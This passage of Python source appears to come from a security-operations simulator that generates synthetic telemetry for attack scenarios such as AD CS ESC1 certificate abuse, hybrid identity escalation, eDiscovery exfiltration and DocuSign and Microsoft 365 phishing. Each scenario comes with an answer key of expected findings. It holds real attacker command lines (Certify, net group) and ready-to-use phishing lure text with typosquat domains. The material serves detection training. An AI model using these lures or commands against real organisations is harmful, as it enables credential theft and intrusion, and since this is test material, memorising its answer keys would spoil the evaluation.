        AttackEvent(event_type="process_event", delay=_delay(8, 4, 2, 20), data={"process_name": "nslookup.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\nslookup.exe", "pid": 7832, "integrity_level": "medium", "command_line": "nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.internal", "hash": "d03e8c51189f0357486383c45f579957008a8ab4025d302a647c2fec9a66e9a9", "user_context": "CORP\\contractor-svc", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 10), data={"process_name": "net.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 8104, "integrity_level": "medium", "command_line": "net group \"Domain Admins\" /domain", "hash": "4c677fde1b7d45f584887e8019679158c34697f8209e020f5f552a0f7104dc35", "user_context": "CORP\\contractor-svc", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # Lateral movement to domain-joined workstation
        AttackEvent(event_type="login", delay=_delay(15, 8, 3, 45), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "method": "SMB", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "whoami.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\whoami.exe", "pid": 9216, "integrity_level": "high", "command_line": "whoami /priv", "hash": "5eaf7de33da6e370c96239d66ee91910776f93101c410947cab83294dfd3e931", "user_context": "CORP\\contractor-svc", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # =====================================================================
        # DAY 2 — AD CS enumeration and certificate abuse
        # =====================================================================
        # Attacker returns next day for AD CS exploitation
        AttackEvent(event_type="login", delay=_delay(1080, 300, 600, 1800), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "Cisco AnyConnect/4.10", "method": "VPN+Password", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "vpn_login": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 30), data={"process_name": "Certify.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Users\\Public\\Certify.exe", "pid": 4420, "integrity_level": "high", "command_line": "Certify.exe find /vulnerable /currentuser", "hash": "393f9789f2430533c8146de480ac150c426b51d966a0febda8a16657c735bc05", "user_context": "CORP\\contractor-svc", "metadata": {"attack_phase": "discovery", "adcs_enumeration": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(8, 4, 2, 20), data={"process_name": "Certify.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Users\\Public\\Certify.exe", "pid": 4488, "integrity_level": "high", "command_line": "Certify.exe request /ca:CORP-DC01-CA /template:UserAuthentication /altname:admin@corp.internal", "hash": "393f9789f2430533c8146de480ac150c426b51d966a0febda8a16657c735bc05", "user_context": "CORP\\contractor-svc", "metadata": {"attack_phase": "privilege_escalation", "adcs_esc1": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 2, 1, 15), data={"app": "Active Directory Certificate Services", "action": "request_certificate", "usage": "admin", "resource_type": "certificate", "resource_name": "UserAuthentication", "success": True, "description": "Certificate issued with admin SAN — ESC1 abuse", "metadata": {"attack_phase": "privilege_escalation", "adcs_esc1": True}}, requires_success=True),
        AttackEvent(event_type="login", delay=_delay(5, 3, 1, 15), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "method": "Certificate", "metadata": {"attack_phase": "privilege_escalation", "is_attacker": True, "forged_cert_auth": True}}, requires_success=True),
        # Validate domain admin access
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 10), data={"process_name": "net.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 5012, "integrity_level": "system", "command_line": "net user admin /domain", "hash": "4c677fde1b7d45f584887e8019679158c34697f8209e020f5f552a0f7104dc35", "user_context": "CORP\\admin", "metadata": {"attack_phase": "privilege_escalation"}}, requires_success=True),
        # =====================================================================
        # DAY 3 — Hybrid identity manipulation + cloud admin access
        # =====================================================================
        AttackEvent(event_type="login", delay=_delay(1080, 300, 600, 1800), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "Cisco AnyConnect/4.10", "method": "VPN+Password", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True, "vpn_login": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "Azure AD Connect", "action": "enumerate_sync_config", "usage": "read", "resource_type": "identity", "resource_name": "aad-connect-server", "success": True, "description": "Enumerated Azure AD Connect sync configuration and service accounts", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 45), data={"app": "Azure AD Connect", "action": "modify_sync_config", "usage": "admin", "resource_type": "identity", "resource_name": "aad-connect-server", "success": True, "description": "Modified hybrid sync rules to escalate cloud role to Global Administrator", "metadata": {"attack_phase": "privilege_escalation", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(30, 15, 5, 90), data={"app": "Azure AD Connect", "action": "force_sync_cycle", "usage": "admin", "resource_type": "identity", "resource_name": "aad-connect-server", "success": True, "description": "Forced delta sync cycle to push privilege escalation to cloud", "metadata": {"attack_phase": "privilege_escalation", "is_attacker": True}}, requires_success=True),
        # Cloud admin login with escalated privileges
        AttackEvent(event_type="login", delay=_delay(20, 10, 5, 60), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Microsoft 365 Admin Center", "action": "verify_role_assignment", "usage": "read", "resource_type": "identity", "resource_name": "global-admin-role", "success": True, "description": "Verified Global Administrator role assignment in M365 admin portal", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True}}, requires_success=True),
        # =====================================================================
        # DAY 4 — eDiscovery mass export and exfiltration
        # =====================================================================
        AttackEvent(event_type="login", delay=_delay(1080, 300, 600, 1800), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 25), data={"app": "Microsoft Purview (eDiscovery)", "action": "assign_ediscovery_manager", "usage": "admin", "resource_type": "compliance", "resource_name": "eDiscovery Manager", "success": True, "description": "Assigned eDiscovery Manager role to compromised account", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "Microsoft Purview (eDiscovery)", "action": "create_ediscovery_case", "usage": "write", "resource_type": "compliance", "resource_name": "Legal Hold Review Q4", "success": True, "description": "Created new eDiscovery case with broad scope", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 25), data={"app": "Microsoft Purview (eDiscovery)", "action": "create_ediscovery_search", "usage": "write", "resource_type": "compliance", "resource_name": "Legal Hold Review Q4", "success": True, "description": "Created content search across all mailboxes and SharePoint sites", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(60, 30, 15, 180), data={"app": "Microsoft Purview (eDiscovery)", "action": "create_export_job", "usage": "write", "resource_type": "compliance", "resource_name": "case-export-full.pst", "success": True, "description": "Initiated bulk PST export job for all matched content", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(30, 15, 10, 90), data={"action": "download", "path": "case-export-full.pst", "system": "purview", "label": "restricted", "category": "legal", "description": "Downloaded eDiscovery PST export (10+ GB)", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(10, 5, 2, 40), data={"source_ip": "{attacker_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 10737418240, "bytes_received": 4096, "description": "Massive outbound transfer — eDiscovery PST exfiltrated (10+ GB)", "metadata": {"attack_phase": "exfiltration", "is_attacker": True}}, requires_success=True),
    ],
    parameters=_COMPOUND_BASE_PARAMS,
    success_rate=0.35,
    iocs=[],
    expected_findings=["Contractor VPN from suspicious geo with impossible travel", "AD CS ESC1 certificate abuse with admin SAN", "Azure AD Connect sync manipulation for cloud privilege escalation", "eDiscovery Manager role self-assignment", "10+ GB PST bulk export and exfiltration"],
    relevant_ioc_keys=["attacker_ip", "attacker_geo"],
)


# =============================================================================
# ORIGINAL SCENARIOS (migrated from scenarios.py)
# =============================================================================

# ---------------------------------------------------------------------------
# Phishing parameter dicts
# ---------------------------------------------------------------------------

DOCUSIGN_PHISHING_PARAMS = {
    "attacker_domains": ["d0cusign-secure.com", "docusign-verify.net", "secure-docusign.com", "docusign.account-verify.com", "docuslgn.com", "d0cusign.net"],
    "sender_names": ["DocuSign", "DocuSign Notifications", "Document Signing Service", "DocuSign Security", "DocuSign Support"],
    "sender_prefixes": ["documents", "notifications", "no-reply", "security", "support", "signing"],
    "phishing_domains": ["docusign-verify.malicious-domain.com", "secure-document-sign.com", "verify-signature.net", "doc-signing-portal.com", "docusign-auth.net"],
    "subjects": [
        "Action Required: {document_type} Awaiting Your Signature",
        "Please Review and Sign: {document_type}",
        "Reminder: Document Pending Your Signature",
        "{sender_name} sent you a document to sign",
        "URGENT: {document_type} - Signature Required",
        "Final Notice: {document_type} Expires Soon",
    ],
    "document_types": ["Quarterly Bonus Agreement", "NDA Amendment", "Expense Report Approval", "Employment Contract Update", "Benefits Enrollment Form", "Project Agreement", "Confidentiality Agreement", "Salary Review Document", "Performance Bonus Letter", "Stock Option Agreement"],
    "email_bodies": [
        "Please review and sign the attached {document_type}. This document requires your immediate attention.\n\nClick the link below to access your document:\n{phishing_url}\n\nThis document will expire in 24 hours.",
        "A new document is waiting for your signature.\n\nDocument: {document_type}\nSender: HR Department\n\nTo sign this document, click here: {phishing_url}",
        "{sender_name} has sent you a document to review.\n\n{document_type}\n\nAccess your document: {phishing_url}\n\nPlease complete by end of business day.",
    ],
    "attacker_geos": ["Eastern Europe", "Russia", "China", "Nigeria", "Unknown VPN", "North Korea"],
    "attacker_ip_ranges": ["185.234.72.", "91.134.128.", "45.227.255.", "103.152.220.", "41.203.76."],
    "attacker_user_agents": [
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/90.0",
        "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/91.0 Mobile",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/92.0",
        "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
    ],
}

MICROSOFT_365_PHISHING_PARAMS = {
    "attacker_domains": ["microsoft-365-login.com", "office365-security.net", "microsoftonline-verify.com", "login-microsoft.net", "microsoft-account-verify.com"],
    "sender_names": ["Microsoft 365", "Microsoft Security", "Office 365 Admin", "Microsoft Account Team"],
    "sender_prefixes": ["security", "no-reply", "admin", "support", "notifications"],
    "phishing_domains": ["login-microsoft365.com", "office365-auth.net", "microsoft-signin.com"],
    "subjects": [
        "Action Required: Verify Your Microsoft 365 Account",
        "Security Alert: Unusual Sign-in Activity",
        "Your Microsoft 365 Password Expires Today",
        "Important: Update Your Security Information",
        "Microsoft 365: Re-verify Your Account",
    ],
    "document_types": ["Account Verification", "Security Update", "Password Reset", "MFA Enrollment"],
    "email_bodies": [
        "We detected unusual activity on your Microsoft 365 account.\n\nTo secure your account, please verify your identity: {phishing_url}\n\nIf you don't verify within 24 hours, your account will be suspended.",
        "Your Microsoft 365 password will expire soon.\n\nClick here to update your password: {phishing_url}\n\nMicrosoft Account Security Team",
    ],
    "attacker_geos": DOCUSIGN_PHISHING_PARAMS["attacker_geos"],
    "attacker_ip_ranges": DOCUSIGN_PHISHING_PARAMS["attacker_ip_ranges"],
    "attacker_user_agents": DOCUSIGN_PHISHING_PARAMS["attacker_user_agents"],
}

IT_SUPPORT_MALWARE_PARAMS = {
    "attacker_domains": ["it-helpdesk-support.com", "tech-support-team.net", "helpdesk-services.com", "it-department-support.net"],
    "sender_names": ["IT Help Desk", "Technical Support", "IT Department", "Help Desk Team"],
    "sender_prefixes": ["support", "helpdesk", "it-team", "tech-support"],
    "subjects": [
        "ACTION REQUIRED: Critical Security Update",
        "IT Support: Please Install Required Update",
        "Mandatory Software Update - Action Needed",
        "IT Department: Security Tool Installation Required",
    ],
    "email_bodies": [
        "Dear Employee,\n\nOur security team has identified your workstation requires an urgent security update.\n\nPlease download and install the required tool: {download_url}\n\nIT Help Desk",
        "URGENT: Your system needs the latest security patch.\n\nDownload the installer: {download_url}\n\nRun the tool immediately to protect your workstation.\n\nIT Support Team",
    ],
    "download_urls": ["https://it-helpdesk-support.com/tools/security_update.exe", "https://tech-support-team.net/downloads/mandatory_patch.exe"],
    "malware_names": SHARED_ATTACKER_INFRA["malicious_executables"],
    **SHARED_ATTACKER_INFRA,
}

VOICEMAIL_PHISHING_PARAMS = {
    "attacker_domains": ["voicemail-notification.com", "vm-message-center.net", "voicemail-service.com", "message-notification.net"],
    "sender_names": ["Voicemail Service", "Unified Messaging", "Voice Message Center", "Phone System"],
    "sender_prefixes": ["noreply", "voicemail", "notifications", "messages"],
    "subjects": [
        "New Voicemail from {caller_number}",
        "You have 1 new voice message",
        "Missed Call - Voicemail Attached",
        "Voice Message Received ({duration} seconds)",
    ],
    "email_bodies": [
        "You received a new voicemail message.\n\nFrom: {caller_number}\nDuration: {duration} seconds\n\nClick to listen: [Play Message]\n\nOr download the attachment to listen offline.",
        "A new voice message was left for you.\n\nCaller: {caller_number}\nTime: {call_time}\n\nOpen the attached file to play the message.",
    ],
    "caller_numbers": ["+1 (555) 123-4567", "+1 (555) 987-6543", "Unknown Caller", "+1 (800) 555-0123"],
    "durations": ["15", "32", "47", "23", "8"],
    **SHARED_ATTACKER_INFRA,
}

VENDOR_INVOICE_QR_PARAMS = {
    "attacker_domains": ["vendor-payment-portal.com", "invoice-payment-center.net", "secure-vendor-pay.com", "payment-processing-hub.net"],
    "sender_names": ["Accounts Payable", "Vendor Services", "Invoice Processing", "Payment Department"],
    "sender_prefixes": ["invoices", "accounts", "payments", "billing"],
    "phishing_domains": ["vendor-payment-portal.com", "invoice-payment-center.net", "secure-vendor-pay.com", "payment-processing-hub.net"],
    "vendor_names": ["Office Supplies Direct", "TechEquip Solutions", "Business Services Inc", "Premier Consulting Group"],
    "subjects": [
        "Invoice #{invoice_number} from {vendor_name}",
        "Payment Required: Invoice {invoice_number}",
        "URGENT: Outstanding Invoice from {vendor_name}",
        "{vendor_name} - Invoice Attached",
    ],
    "email_bodies": [
        "Please find attached invoice #{invoice_number} from {vendor_name}.\n\nAmount Due: ${amount}\nDue Date: {due_date}\n\nScan the QR code in the PDF to process payment quickly.",
        "Invoice #{invoice_number}\n\nVendor: {vendor_name}\nAmount: ${amount}\n\nTo expedite payment, use the QR code in the attached PDF.",
    ],
    "amounts": ["2,450.00", "8,750.00", "15,320.00", "3,200.00"],
    **SHARED_ATTACKER_INFRA,
}

# ---------------------------------------------------------------------------
# Account takeover parameter dicts
# ---------------------------------------------------------------------------

CREDENTIAL_STUFFING_PARAMS = {
    "attacker_geos": SHARED_ATTACKER_INFRA["attacker_geos"],
    "attacker_ip_ranges": SHARED_ATTACKER_INFRA["c2_ips"],
    "attacker_user_agents": SHARED_ATTACKER_INFRA["attacker_user_agents"],
    "evilginx_domains": SHARED_ATTACKER_INFRA["evilginx_domains"],
    "failure_reasons": ["invalid_password", "invalid_password", "invalid_password", "account_locked", "captcha_required"],
}

MFA_FATIGUE_PARAMS = {
    "push_counts": [47, 52, 38, 63, 41],
    "attacker_devices": ["Unknown iPhone", "Android Device", "Unknown Device", "New Mobile Device"],
    "attacker_geos": SHARED_ATTACKER_INFRA["attacker_geos"],
    "attacker_ip_ranges": SHARED_ATTACKER_INFRA["c2_ips"],
    "attacker_user_agents": SHARED_ATTACKER_INFRA["attacker_user_agents"],
}

SESSION_HIJACKING_PARAMS = {
    "token_stealer_names": ["browser_helper.exe", "cookie_manager.dll", "session_sync.exe"],
    "attacker_geos": SHARED_ATTACKER_INFRA["attacker_geos"],
    "attacker_ip_ranges": SHARED_ATTACKER_INFRA["c2_ips"],
    "attacker_user_agents": SHARED_ATTACKER_INFRA["attacker_user_agents"],
}

HELPDESK_SOCIAL_ENGINEERING_PARAMS = {
    "ticket_subjects": ["Locked out of account - urgent", "MFA not working, need help ASAP", "Lost phone, can't access MFA", "Urgent: Need account access for deadline"],
    "attacker_devices": ["New iPhone 15 Pro", "Samsung Galaxy S24", "Unknown Device", "Pixel 8 Pro"],
    "attacker_domains": ["external-helpdesk.com", "it-support-portal.net", "account-recovery-center.com"],
    "sender_names": ["IT Help Desk", "Account Recovery", "Tech Support"],
    "sender_prefixes": ["support", "helpdesk", "account-recovery"],
    "attacker_geos": SHARED_ATTACKER_INFRA["attacker_geos"],
    "attacker_ip_ranges": SHARED_ATTACKER_INFRA["c2_ips"],
    "attacker_user_agents": SHARED_ATTACKER_INFRA["attacker_user_agents"],
}

# ---------------------------------------------------------------------------
# Malware parameter dicts
# ---------------------------------------------------------------------------

LOLBINS_ATTACK_PARAMS = {
    "initial_vectors": ["Excel Macro", "Word Macro", "HTA File"],
    "lolbin_chains": [
        ["powershell.exe", "certutil.exe", "mshta.exe"],
        ["cmd.exe", "bitsadmin.exe", "regsvr32.exe"],
        ["wscript.exe", "powershell.exe", "msiexec.exe"],
    ],
    "c2_domains": SHARED_ATTACKER_INFRA["c2_domains"],
    "persistence_methods": ["Registry Run Key", "Scheduled Task", "Startup Folder", "WMI Subscription"],
}

RANSOMWARE_PARAMS = {
    "initial_access_methods": ["RDP Brute Force", "Phishing", "VPN Exploit"],
    "c2_frameworks": ["Cobalt Strike", "Metasploit", "Sliver"],
    "ransomware_families": ["LockBit", "BlackCat", "Conti", "REvil"],
    "encryption_extensions": [".locked", ".encrypted", ".crypted", ".pay2decrypt"],
    "c2_domains": SHARED_ATTACKER_INFRA["c2_domains"],
    "attacker_geos": SHARED_ATTACKER_INFRA["attacker_geos"],
    "attacker_ip_ranges": SHARED_ATTACKER_INFRA["c2_ips"],
}

FILELESS_MALWARE_PARAMS = {
    "delivery_vectors": ["Teams Link", "Slack Link", "Email Link"],
    "initial_payloads": ["JavaScript", "HTA", "PowerShell"],
    "c2_domains": SHARED_ATTACKER_INFRA["c2_domains"],
    "exfil_methods": ["DNS Tunneling", "HTTPS POST", "Encoded URL Parameters"],
    "memory_techniques": ["Process Hollowing", "DLL Injection", "Reflective Loading"],
}

USB_MALWARE_PARAMS = {
    "usb_vendors": ["SanDisk", "Kingston", "Samsung", "Unknown"],
    "autorun_names": ["autorun.inf", "desktop.ini"],
    "malware_names": ["system32.exe", "svchost.exe", "csrss.exe", "lsass.exe"],
    "spread_methods": ["SMB Share", "Network Drive", "Email Attachment"],
    "miner_pools": ["pool.minexmr.com", "xmr.nanopool.org", "supportxmr.com"],
}

# ---------------------------------------------------------------------------
# DLP parameter dicts
# ---------------------------------------------------------------------------

MASS_DOWNLOAD_PARAMS = {
    "file_counts": [2847, 1523, 3241, 1892],
    "target_paths": ["/sales/customer_data/", "/engineering/source_code/", "/finance/reports/", "/hr/employee_records/"],
    "external_destinations": ["drive.google.com", "dropbox.com", "onedrive.live.com", "personal-backup.s3.amazonaws.com"],
    "sensitive_patterns": ["customer_list", "pricing_data", "roadmap", "financial_projections"],
}

PERSONAL_EMAIL_EXFIL_PARAMS = {
    "source_apps": ["Salesforce", "HubSpot", "SAP", "Workday"],
    "personal_domains": ["gmail.com", "yahoo.com", "hotmail.com", "protonmail.com"],
    "external_destinations": ["user.backup@gmail.com", "my.files@yahoo.com", "personal.archive@hotmail.com", "secure.backup@protonmail.com"],
    "export_types": ["CSV Export", "PDF Report", "Excel Download"],
    "sensitive_data_types": ["Customer Contact List", "Sales Pipeline Report", "Financial Summary", "Employee Directory"],
}

CLOUD_STORAGE_SYNC_PARAMS = {
    "sync_apps": ["Dropbox", "Google Drive", "Box", "iCloud"],
    "source_locations": ["SharePoint", "OneDrive for Business", "Network Drives", "Local Documents"],
    "share_types": ["Public Link", "External User Share", "Anonymous Access"],
}

SCREENSHOT_PRINT_EXFIL_PARAMS = {
    "screenshot_tools": ["Snipping Tool", "Greenshot", "ShareX", "PrintScreen"],
    "printers": ["HP LaserJet 4th Floor", "Canon ImageRunner", "Xerox WorkCentre", "PDF Printer"],
    "usb_types": ["iPhone", "Android Phone", "USB Drive", "External HDD"],
    "document_types": ["Confidential Report", "Strategic Plan", "Customer List", "Financial Statement"],
}

# ---------------------------------------------------------------------------
# Phishing scenario definitions
# ---------------------------------------------------------------------------

DOCUSIGN_CREDENTIAL_HARVEST = AttackScenario(
    id="docusign_credential_harvest",
    tier="T2",
    name="DocuSign Credential Harvesting",
    description="External attacker sends phishing email impersonating DocuSign to harvest corporate credentials. Email uses typosquatting domain and urgent language to trick victim into entering credentials on fake login page. After stealing credentials, the attacker logs in from a foreign IP, searches the victim's mailbox for sensitive content, reads confidential emails, creates an inbox rule to hide security alerts, accesses SharePoint documents, and generates suspicious network traffic.",
    attack_type="phishing",
    events=[
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "contains_url": "{phishing_url}", "metadata": {"is_malicious": True, "attack_phase": "delivery"}}, requires_success=False),
        AttackEvent(event_type="app_event", delay=_delay(20, 15, 2, 120), data={"app": "Outlook", "action": "open_url", "resource_name": "{phishing_url}", "success": True, "description": "User clicked phishing URL from DocuSign email", "metadata": {"attack_phase": "exploitation"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(10, 5, 1, 60), "data": {"app": "Outlook", "action": "report_phishing", "description": "User reported suspicious email", "success": True}}),
        AttackEvent(event_type="app_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"app": "Microsoft Edge", "action": "navigate", "resource_name": "{phishing_domain}", "success": True, "description": "User navigated to phishing credential harvest site", "metadata": {"attack_phase": "exploitation"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.5, 5), data={"app": "Microsoft Edge", "action": "form_submit", "resource_name": "{phishing_domain}", "success": True, "description": "User entered credentials on fake DocuSign login page", "metadata": {"attack_phase": "credential_capture"}}, requires_success=True),
        AttackEvent(event_type="login", delay=_delay(30, 20, 5, 180), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'contract OR NDA OR salary OR bonus OR confidential'", "success": True, "description": "Attacker searched mailbox for sensitive keywords related to contracts and compensation", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "Re: NDA Amendment — Signature Required by Friday", "success": True, "description": "Attacker read email containing NDA amendment details", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "FW: Annual Bonus Structure — Manager Review", "success": True, "description": "Attacker read confidential bonus structure email", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_delete_alerts", "resource_name": "Auto-Delete Security Alerts", "success": True, "description": "Inbox rule created to auto-delete emails containing 'security alert' or 'unusual sign-in'", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(12, 6, 3, 30), data={"app": "SharePoint Online", "action": "navigate", "resource_type": "site", "resource_name": "https://company.sharepoint.com/sites/Legal", "success": True, "description": "Attacker browsed Legal SharePoint site", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "download", "path": "https://company.sharepoint.com/sites/Legal/Shared Documents/Active-Contracts-Summary.xlsx", "system": "sharepoint", "label": "confidential", "category": "legal", "description": "Attacker downloaded active contracts summary from Legal SharePoint", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 10), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 131072, "bytes_received": 524288, "description": "Sustained HTTPS session to M365 from foreign IP — mailbox and SharePoint access"}, requires_success=True),
    ],
    parameters=DOCUSIGN_PHISHING_PARAMS,
    success_rate=0.7,
    iocs=["d0cusign-secure.com", "docusign-verify.net", "docusign-verify.malicious-domain.com"],
    expected_findings=["Phishing email from DocuSign typosquatting domain", "Suspicious login from foreign IP", "Inbox rule created to auto-delete security alerts", "Legal SharePoint documents downloaded"],
    relevant_ioc_keys=["attacker_email", "attacker_domain", "phishing_domain", "phishing_url", "attacker_ip"],
)

MICROSOFT_365_CREDENTIAL_HARVEST = AttackScenario(
    id="microsoft_365_credential_harvest",
    tier="T2",
    name="Microsoft 365 Credential Harvesting",
    description="Attacker impersonates Microsoft 365 security alert to steal credentials. After credential capture, the attacker logs in from a foreign IP, browses the M365 portal, searches the victim's mailbox for sensitive content, reads confidential emails, creates an inbox rule to suppress security notifications, and accesses OneDrive and SharePoint to download documents.",
    attack_type="phishing",
    events=[
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "contains_url": "{phishing_url}", "metadata": {"is_malicious": True, "attack_phase": "delivery"}}, requires_success=False),
        AttackEvent(event_type="app_event", delay=_delay(15, 10, 1, 60), data={"app": "Outlook", "action": "open_url", "resource_name": "{phishing_url}", "success": True, "description": "Clicked security alert link", "metadata": {"attack_phase": "exploitation"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(5, 3, 1, 30), "data": {"app": "Outlook", "action": "delete_email", "description": "User deleted suspicious email", "success": True}}),
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.1, 2), data={"app": "Microsoft Edge", "action": "form_submit", "resource_name": "{phishing_domain}", "success": True, "description": "Submitted credentials to external site", "metadata": {"attack_phase": "credential_capture"}}, requires_success=True),
        AttackEvent(event_type="login", delay=_delay(45, 30, 10, 240), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Microsoft 365", "action": "access_dashboard", "resource_name": "M365 Admin Portal — Users, Groups, Licenses", "success": True, "description": "Attacker browsed M365 portal to enumerate tenant", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'password OR credentials OR API key OR secret OR financial'", "success": True, "description": "Attacker searched mailbox for sensitive keywords", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "Re: Shared Service Account Credentials — Updated", "success": True, "description": "Attacker read email containing shared service account credentials", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "FW: Q4 Financial Results — Pre-Release Draft", "success": True, "description": "Attacker read pre-release financial results email", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_suppress_alerts", "resource_name": "Move Security Alerts to Deleted Items", "success": True, "description": "Inbox rule created to move security notification emails to Deleted Items", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "OneDrive", "action": "navigate", "resource_type": "folder", "resource_name": "OneDrive — Personal/Documents/Projects", "success": True, "description": "Attacker browsed victim's OneDrive project documents", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
